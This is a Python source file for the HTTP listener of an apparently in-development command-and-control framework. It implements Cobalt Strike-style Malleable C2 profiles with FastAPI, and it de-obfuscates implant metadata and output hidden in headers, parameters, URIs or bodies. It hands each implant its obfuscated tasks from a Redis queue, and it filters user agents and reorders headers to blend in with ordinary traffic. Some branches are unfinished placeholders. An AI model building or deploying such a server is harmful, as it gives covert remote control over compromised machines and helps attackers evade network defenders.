"""
HTTP Malleable C2 Listener

An HTTP Listener, which is defined by a Malleable C2 Profile.


Note on return types, keeping it simple. These are the only http status
codes used.

200: OK, continue with whatever
204: No content, things worked but nothign for you
400/404: requester fucked something up, go away/try again later
500: something went wrong
"""

from time import sleep
from edwh_uuid7 import uuid7
import re
import msgpack
from mpp import MalleableProfile
from fastapi import Response, FastAPI, Request, status, HTTPException
from fastapi.responses import JSONResponse
from yarl import URL
import uvicorn
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.datastructures import MutableHeaders
from ..malc2 import (
    HttpGetBlockServerParser,
    HttpGetBlockClientParser,
    HttpPostBlockServerParser,
    HttpPostBlockClientParser,
    HttpConfigBlockServerParser,
)
from ...modules.redis_functions import RedisImplantTaskService
from ...modules.task import Task, TaskResponse, Metadata


app = FastAPI
mp = MalleableProfile


# entrypoint
def run(listener_uuid: str):
    # make mp global to this module so we don't have to  read from it/pass everywhere constantly
    global mp, app
    # placeholder
    mp = MalleableProfile(profile="/home/ubuntu-dev/LongHaulC2/webbug_getonly.profile")
    print(mp)

    # to shutoff docs
    # app = FastAPI(
    #     docs_url=None,
    #     redoc_url=None,
    #     openapi_url=None,
    # )
    app = FastAPI(
        title="LongHaul C2 HTTP Listener",
        description="Malleable C2 defined Listener endpoints",
        version="0.0.0",
    )

    # header handling
    app.add_middleware(HeadersMiddleware)

    # setup get route
    http_get_method = getattr(mp.http_get.verb, "value", "GET")
    register_http_route(
        method=http_get_method,
        uri=URL(mp.http_get.uri.value),
        endpoint=http_get,
        uri_endpoint=http_get_uri,
    )

    # setup post route
    http_post_method = getattr(mp.http_post.verb, "value", "POST")
    register_http_route(
        method=http_post_method,
        uri=URL(mp.http_post.uri.value),
        endpoint=http_post,
        uri_endpoint=http_post_uri,
    )

    # reload needs to be OFF.
    # server_header=false disabled  "server uvicorn" in the response
    uvicorn.run(app, host="0.0.0.0", port=8000, reload=False, server_header=False)


###################################
# Various Handlers
###################################


def check_if_data(data_from_request):  #
    """
    Check if somehting (the request, a value you extracted, etc) had data (evaluates falsey-ness). If not, return a 400.

    data_from_request: The data that was in the request, and needs to not be empty/missing.

    Here so I don't repeat this line 58145148754 times for each case/switch
    """
    if not data_from_request:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            # intentially vague to not give away what field the data is in
            detail=f"Missing required data",
        )


def check_user_agent(user_agent) -> bool:
    """
    Checks user agent. If allowed (via profile), returns True
    else, False.

    Calling function should return a 404 on a check fail

    https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-server-config.htm#_Toc65482845
    """
    hcbsp = HttpConfigBlockServerParser(mp.http_config)

    # Get the blocked and allowed user agents from the configuration
    blocked_useragents = hcbsp.get_blocked_user_agents()
    allowed_useragents = hcbsp.get_allowed_user_agents()

    print("Blocked user agents:", blocked_useragents)
    print("Allowed user agents:", allowed_useragents)

    # First, check for blocked user agents
    if blocked_useragents:
        for pattern in blocked_useragents:
            # Convert the pattern to a regular expression
            regex = pattern.replace("*", ".*")  # Convert * to .*

            # Check if the user-agent matches the pattern
            if re.match(regex, user_agent):
                print(f"Blocked by pattern: {pattern}")
                return False  # Blocked agent

    # If blocked_useragents passed, we don't need to check allowed_useragents
    # But if allowed_useragents are specified and blocked didn't block, we check allow
    if allowed_useragents:
        for pattern in allowed_useragents:
            # Convert the pattern to a regular expression
            regex = pattern.replace("*", ".*")  # Convert * to .*

            # Check if the user-agent matches the pattern
            if re.match(regex, user_agent):
                print(f"Allowed by pattern: {pattern}")
                return True  # Allowed agent

    # Default return if no matches were found
    # print("User-agent not allowed (no matching patterns found)")
    return True  # Default to allow through if not in blocked, and there's nothign in


# getting a 400 somehow:
#'NoneType' object has no attribute 'data'
async def deobsfucate_malleable_c2_request_data(
    request: Request,
    terminator_type,
    # coudl just require the parser class instead of adding both
    malleable_c2_block,
    parser_class,
    terminator_key=None,
) -> bytes:
    """
    Extracts data from the HTTP request based on the specified terminator type.
    This function is designed to work with the FastAPI `Request` object to extract
    relevant data (e.g., headers, query parameters, or body content) based on the
    configured extraction method.

    The function is tightly coupled with the HTTP request structure, making it
    suitable for use in FastAPI endpoints that process incoming requests.

    Parameters:
    - request (Request): The FastAPI `Request` object containing the HTTP request data.
    - terminator_type (str): Specifies the type of terminator used to define where to extract the data from. Possible values are:
        - "header": Extracts data from the HTTP headers.
        - "parameter": Extracts data from URL query parameters.
        - "print": Extracts data from the request body.
    - terminator_key (str, optional): The key used to identify the specific data within the terminator type. For example, the header or parameter name. This is only required for certain terminator types (like "header" or "parameter").
    - Malleable C2 block: The block to get values from: ex: mp.http_get.client if decoding an inbound GET request
    - parser_class: The parser class used to extract data. Ex, HttpPostBlockServerParser. Needed because each class has some block specific options

    Returns:
    - bytes: The extracted data

    Raises:
    - ValueError: If an unsupported `terminator_type` is provided.
    - Exception: If there is an error during the data extraction or transformation process.

    Notes:
    - This function assumes the `request` object is passed, which is required for data extraction from headers, query parameters, and the body. It is specifically designed for FastAPI endpoints.
    - The function includes basic error handling, raising exceptions when an unsupported terminator type is provided or if data extraction fails.
    """
    match terminator_type:
        # [X] works
        case "header":
            normalized_headers = {k.lower(): v for k, v in request.headers.items()}
            data_from_request = normalized_headers.get(terminator_key.lower())
            print(f"Data from request: {data_from_request}")
            check_if_data(data_from_request)

            try:
                hce = parser_class(client_block=malleable_c2_block)
                data = hce.apply_transforms(data=data_from_request)
                print(f"De-Obsfucated data: {data}")
                return data
            except Exception as e:
                print(e)
                raise e

        # [X] works
        case "parameter":
            data_from_request = request.query_params.get(terminator_key)
            print(f"Data from request: {data_from_request}")

            check_if_data(data_from_request)

            try:
                hce = parser_class(client_block=malleable_c2_block)
                data = hce.apply_transforms(data=data_from_request)
                print(f"De-Obsfucated data: {data}")
                return data
            except Exception as e:
                print(e)
                raise e
        # [X] works
        case "print":
            # in body, so just get body
            data_from_request = await request.body()

            check_if_data(data_from_request)

            try:
                hce = parser_class(client_block=malleable_c2_block)
                data = hce.apply_transforms(data=data_from_request)
                print(f"De-Obsfucated data: {data}")
                return data
            except Exception as e:
                print(e)
                raise e
        case _:
            # unknown terminator
            print("Unknown terminator: %r", terminator_type)
            # throw error cuz we can't continue if we don't have the task
            raise ValueError


###################################
# Various Middleware
###################################
class HeadersMiddleware(BaseHTTPMiddleware):
    """
    Add/removes headers to each request.

    Pulls which headers to add/remove based on malleable c2 profiles
    """

    async def dispatch(self, request, call_next):
        # Call the next request handler
        response = await call_next(request)

        hcbsp = HttpConfigBlockServerParser(mp.http_config)

        headers_to_add = hcbsp.get_headers_to_add_to_request()
        # get all added headers
        for header, value in headers_to_add.items():
            # del existing headers first (so you don't endup with 2 of the same)
            # RFC 7230 (Section 3.2.2) (for HTTP/1.1) states that:
            # A sender SHOULD NOT generate duplicate header fields, and a recipient SHOULD ignore duplicate header fields unless otherwise indicated."
            if header in response.headers:
                """
                Ignore header if it already exists.
                https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-server-config.htm#_Toc65482845

                header - This keyword adds a header value to each of Cobalt Strike’s HTTP
                responses. If the header value is already defined in a response, this value
                is ignored.
                """
                continue

            # then add
            print(f"Adding header: {header}: {value}")
            response.headers[header] = value

            # could just replace too instead of deleting.

        # After constructing, reorder the headers according to the desired order
        ordered_headers = hcbsp.reorder_headers(response.headers)
        """
            oh my fuck this is kind of cursed. Had to go into the response calss
            definition, and find a method that reset the headers.
            hopefully this doesn't break in the future, but for now,
            init_headers takes a dict of headers, which overwrites the old ones.

            Headers work and are in order now

            Note: Date seems to show up first every time for some reason. 
        """
        response.init_headers(headers=ordered_headers)
        print(response.headers)

        return response


###################################
# HTTP GET
###################################
"""
HTTP POST with CS is where task data is retrieved from the server.

"""


async def http_get(request: Request) -> Response:
    """
    HTTP GET endpoint for the HTTP listener.

    Note:
    - Accepts all URL parameters via **kwargs.
    - OpenAPI parameter documentation is not generated due to the **kwargs
    - This design enables a more flexible and malleable C2 interface.

    !!Holy shit clean this all up
    """
    # security checks
    user_agent = request.headers.get("user-agent")
    print(user_agent)

    # 404 on fail. Can't sinkhole without extra setup/steps atm.
    if not check_user_agent(user_agent):
        return Response(status_code=404)

    """
    Handle inputted data form fastapi

    """
    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
    try:
        metadata_terminator_type, metadata_terminator_key = (
            hce.get_metadata_terminator()
        )
        data_from_implant = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=metadata_terminator_type,
            terminator_key=metadata_terminator_key,
            malleable_c2_block=mp.http_get.client,
            parser_class=HttpGetBlockClientParser,
        )
        print(f"Data from implant: {data_from_implant}")
    except Exception as e:
        print(e)
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    """
    Setup a response for the implant

    """

    # take extracted data, shove into class:
    try:
        unpacked_metadata = msgpack.unpackb(data_from_implant)
        md = Metadata(unpacked_metadata)
        md.validate()  # , if err return 400 malformed
    except Exception as e:
        print(e)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Malformed data",
        )

    # note, payload would need to be inserted somehwere here too.  Ex,
    # redis lookup for next task -> insert where print it
    # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    implant_id = unpacked_metadata.get("implant_uuid", None)
    check_if_data(implant_id)

    its = RedisImplantTaskService(implant_id)
    msgpack_task = its.dequeue_task()
    if not msgpack_task:

        raise HTTPException(
            status_code=204  # 204 for no content, but the request suceeded.
        )

    # pass in block to respective class
    # get the stuff we need from it
    emitter = HttpGetBlockServerParser(mp.http_get.server)
    headers = emitter.headers()
    obsfucated_task = emitter.generate_data(msgpack_task)

    """
    Statement 	        What
    ------------------------------------------------
    header "header" 	Store data in an HTTP header
    parameter "key" 	Store data in a URI parameter
    print 	            Send data as transaction body
    uri-append 	        Append to URI (seperate function, see http_get_uri)
    """
    terminator_type, target = emitter.get_output_terminator()

    # The print statement is the expected termination statement for the http-get.server.output, http- post.server.output, and http-stager.server.output blocks. You may use the header, parameter, print and uri-append termination statements for the other blocks.
    """
        Big note here: Traditional Malleable C2/Beacon only supports 
        the `print` terminator for responses for
        http-get.server.output, http- post.server.output, and http-stager.server.output blocks.

        This seems like an overcomeable limitation, especially with the header field (can hide data there), 
        but for now, I'll stick to spec. 
        
        https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482842
    """
    match terminator_type:

        # case "header":
        #     # send data in a header
        #     headers[target] = obsfucated_task
        #     # construct response here

        case "print":
            # send data in the body
            body = obsfucated_task
            # and construct the response
            return Response(content=body, headers=headers)

        case _:
            # unknown terminator
            print("Unknown terminator: %r", terminator_type)
            return Response(status_code=500)


async def http_get_uri(request: Request) -> Response:
    """
    Same as the http_get method, but URI specific, as that requires extra handling on the fastapi
    side.
    """
    try:
        print(request)
        path = request.url.path
        print("Full path:", path)

        # Last segment
        data_in_uri = path.rstrip("/").split("/")[-1]
        print("Last data_in_uri:", data_in_uri)
    except Exception as e:
        print(e)
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    # we can assume URI terminator is uri-append.
    # data is the /someendpoint/<HERE>, so we just need to grab it, and transform it.

    hce = HttpGetBlockClientParser(client_block=mp.http_get.client)
    try:
        deobsfucated_data_from_implant = hce.apply_transforms(data=data_in_uri)
        print(f"De-Obsfucated data: {deobsfucated_data_from_implant}")
        print(f"Data from implant: {data_in_uri}")
    except Exception as e:
        print(e)
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    """
    Setup a response for the implant

    """
    # take extracted data, shove into class:
    try:
        unpacked_metadata = msgpack.unpackb(deobsfucated_data_from_implant)
        md = Metadata(unpacked_metadata)
        md.validate()  # , if err return 400 malformed
    except Exception as e:
        print(e)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Malformed data",
        )

    # note, payload would need to be inserted somehwere here too.  Ex,
    # redis lookup for next task -> insert where print it
    # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    implant_id = unpacked_metadata.get("implant_uuid", None)
    check_if_data(implant_id)

    its = RedisImplantTaskService(implant_id)
    msgpack_task = its.dequeue_task()
    if not msgpack_task:
        raise HTTPException(
            status_code=204  # 204 for no content, but the request suceeded.
        )

    # pass in block to respective class
    # get the stuff we need from it
    emitter = HttpGetBlockServerParser(mp.http_get.server)
    headers = emitter.headers()
    obsfucated_task = emitter.generate_data(msgpack_task)

    """
    Setup a response for the implant

    """
    # Ex: header: store in header
    terminator_type, target = emitter.get_output_terminator()

    match terminator_type:

        # case "header":
        #     # send data in a header
        #     headers[target] = obsfucated_task
        #     # construct response here

        case "print":
            # send data in the body
            body = obsfucated_task
            # and construct the response
            return Response(content=body, headers=headers)

        case _:
            # unknown terminator
            print("Unknown terminator: %r", terminator_type)
            return Response(status_code=500)


###################################
# HTTP POST
###################################
"""
HTTP POST with CS is where task response data is sent back to

"""


async def http_post(request: Request) -> Response:
    """
    HTTP POST endpoint for the HTTP listener.

    Note:
    - Accepts all URL parameters via **kwargs.
    - OpenAPI parameter documentation is not generated due to the **kwargs
    - This design enables a more flexible and malleable C2 interface.

    """
    user_agent = request.headers.get("user-agent")
    print(user_agent)
    # 404 on fail. Can't sinkhole without extra setup/steps atm.
    if not check_user_agent(user_agent):
        return Response(status_code=404)
    """
    Handle inputted data form fastapi.

    On failure,return a 400 for bad data

    """
    hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
    # extract terminator data
    # for some reason, http-post uses output, not metadata
    try:
        output_terminator_type, output_terminator_key = hce.get_output_terminator()
        data_from_implant = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=output_terminator_type,
            terminator_key=output_terminator_key,
            malleable_c2_block=mp.http_post.client,
            parser_class=HttpPostBlockClientParser,
        )
        print(f"Data from implant: {data_from_implant}")
    except Exception as e:
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    try:
        id_terminator_type, id_terminator_key = hce.get_id_terminator()
        implant_id = await deobsfucate_malleable_c2_request_data(
            request=request,
            terminator_type=id_terminator_type,
            terminator_key=id_terminator_key,
            malleable_c2_block=mp.http_post.client,
            parser_class=HttpPostBlockClientParser,
        )
        print(f"Implant ID: {implant_id}")
    except Exception as e:
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    """
    Setup a response for the implant

    """
    # pass in block to respective class
    emitter = HttpPostBlockServerParser(mp.http_post.server)

    # get the stuff we need from it
    headers = emitter.headers()
    data = emitter.generate_data()

    # note, payload would need to be inserted somehwere here too.  Ex,
    # redis lookup for next task -> insert where print it

    # based on terminationstatement, need to store data in certain location
    # Ex: header: store in header

    """
    Statement 	        What
    ------------------------------------------------
    header "header" 	Store data in an HTTP header
    parameter "key" 	Store data in a URI parameter
    print 	            Send data as transaction body
    uri-append 	        Append to URI (seperate function, see http_post_uri)
    """
    terminator_type, target = emitter.get_output_terminator()

    match terminator_type:
        case "header":
            # send data in a header
            headers[target] = data
            # construct response here

        case "parameter":
            # send data as URI parameter
            # params[target] = data
            print("placeholder uri paramter")

        case "uri-append":
            # append data to URL path
            # url += data.decode("latin-1")
            print("placeholder uri append")

        case "print":
            # send data in the body
            body = data
            # and construct the response
            return Response(content=body, headers=headers)

        case _:
            # unknown terminator
            print("Unknown terminator: %r", terminator_type)
            return Response(status_code=500)


async def http_post_uri(request: Request, data: str) -> Response:
    """ """

    # we can assume URI terminator is uri-append.
    # data is the /someendpoint/<HERE>, so we just need to transform it.

    full_uri = str(
        request.url
    )  # Full URL including the scheme, host, path, and query params. useful for logging

    try:
        hce = HttpPostBlockClientParser(client_block=mp.http_post.client)
        print(f"De-Obsfucated data: {hce.apply_transforms(data=data)}")

        print(f"Full URL: {full_uri}")
        print(f"Data from URL: {data}")
    except Exception as e:
        raise HTTPException(status_code=400, detail="Invalid or malformed client data")

    # save to redis...
    # generate response...

    """
    Setup a response for the implant

    """

    # pass in block to respective class
    emitter = HttpPostBlockServerParser(mp.http_post.server)

    # get the stuff we need from it
    headers = emitter.headers()
    data = emitter.generate_data()

    # note, payload would need to be inserted somehwere here too.  Ex,
    # redis lookup for next task -> insert where print it


###################################
# Route setup
###################################


def register_http_route(uri: URL, method: str, endpoint, uri_endpoint):
    """
    Registeres routes. Prevents these being called on import as well.
    """
    # HTTP POST ROUTE
    app.add_api_route(
        path=str(URL(uri)),
        endpoint=endpoint,  # logic for endpoint here
        methods=[method],
        # response_model=dict,
        # tags=["items"],
    )

    # for uri-append, add another route
    # hack together a string for what it wants: "myuri/{data}"
    full_uri = str(uri) + "/{data}"
    # Register the route with the dynamic path
    app.add_api_route(
        path=str(full_uri),
        endpoint=uri_endpoint,  # The handler function for this route
        methods=[method],
    )
    """
    Why Two Routes are Needed in FastAPI:

    FastAPI resolves routes based on exact paths. When using Cobalt Strike's `uri-append` 
        (e.g., `/myuri/some-random-data`), FastAPI treats `/myuri` as a fixed endpoint and doesn't automatically handle `/myuri/{data}`. 

    To handle this, you need two routes:
    1. One for the base path (`/myuri`). (note, /myuri/ will 307 -> /myuri, this is fine)
    2. Another for the dynamic append (`/myuri/{data}`).

    This way, FastAPI can process both the static and dynamic parts of the URL correctly.    
    """


# name == main linter here? ex, setup and show what a request might look like?
# not a must.
